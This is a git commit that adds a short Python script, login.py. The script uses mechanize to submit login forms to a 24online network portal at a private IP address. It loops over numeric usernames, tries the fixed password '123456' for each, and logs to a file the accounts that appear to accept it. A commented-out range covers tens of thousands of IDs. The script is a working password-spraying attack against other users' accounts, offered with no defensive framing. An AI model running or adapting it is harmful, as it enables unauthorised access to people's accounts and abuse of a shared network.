dd3d5fc0e15979a9b57604fa0d3872478cb988ad
Apratim Mukherjee <apratim101@gmail.com>
2017-07-19 00:54:44 +0530

    Final Code

---
+++ login.py
@@ -0,0 +1,45 @@
+import mechanize
+from BeautifulSoup	import BeautifulSoup
+
+
+class SanitizeHandler(mechanize.BaseHandler):
+	def http_response(self, request, response):
+		if not hasattr(response, "seek"):
+			response = mechanize.response_seek_wrapper(response)
+
+		if response.info().dict.has_key('content-type') and ('html' in response.info().dict['content-type']):
+			soup = BeautifulSoup(response.get_data())
+			response.set_data(soup.prettify())
+		return response
+
+
+filename = "Usrnm.txt"
+
+#br = mechanize.Browser()
+
+br = mechanize.Browser(factory=mechanize.RobustFactory())
+br.add_handler(SanitizeHandler())
+br.set_handle_equiv(True)
+br.set_handle_redirect(True)
+br.set_handle_referer(True)
+br.set_handle_robots(False)
+
+br.open("http://172.16.16.16/24online/webpages/client.jsp")
+#for num in range(160945452,161020000):#lower cap, upper cap
+for num in range(160907387, 160907389):
+		try:
+			n=str(num)
+			print(n)
+			br.select_form(nr=0)
+			br.form['username'] = n		
+			br.form['password']  = '123456'
+			response=br.submit()
+			print("Done")			
+			
+		except:
+			target = open(filename, 'a')
+			n=int(n)-1
+			n=str(n)
+			target.write(n)
+			target.write("\n")				
+			break;
